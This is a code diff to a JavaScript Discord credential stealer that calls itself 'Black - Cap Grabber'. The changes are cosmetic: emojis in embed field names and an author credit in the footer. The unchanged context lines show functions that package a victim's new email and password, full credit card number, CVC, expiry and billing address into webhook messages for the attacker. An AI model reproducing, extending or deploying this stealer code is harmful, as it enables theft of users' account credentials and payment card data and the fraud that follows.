@@ -237,12 +237,12 @@ function ChangeEmail(newemail, password, token) {
                         "color": 000000,
                         "fields": [
                             {
-                                "name": "**Email Changed**",
+                                "name": "📧 **Email Changed**",
                                 "value": `New Email: ${newemail}\nPassword: ${password}`,
                                 "inline": true
                             },
                             {
-                                "name": "**Other Info**",
+                                "name": "🖥️ **Other Info**",
                                 "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
                                 "inline": true
                             },
@@ -257,7 +257,7 @@ function ChangeEmail(newemail, password, token) {
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
-                            "text": "Black - Cap Grabber"
+                            "text": "Black - Cap Grabber By KSCH"
                         }                
                     }
                 ]
@@ -291,12 +291,12 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
                         "color": 000000,
                         "fields": [
                             {
-                                "name": "**Credit Card Added**",
+                                "name": "💳 **Credit Card Added**",
                                 "value": `Credit Card Number: ${number}\nCredit Card Expiration: ${expir_month}/${expir_year}\nCVC: ${cvc}\n Country: ${country}\nState ${state}\nCity ${city}\nZIP: ${zip}\n Street: ${street}`,
                                 "inline": true
                             },
                             {
-                                "name": "**Other Info**",
+                                "name": "🖥️ **Other Info**",
                                 "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
                                 "inline": true
                             },
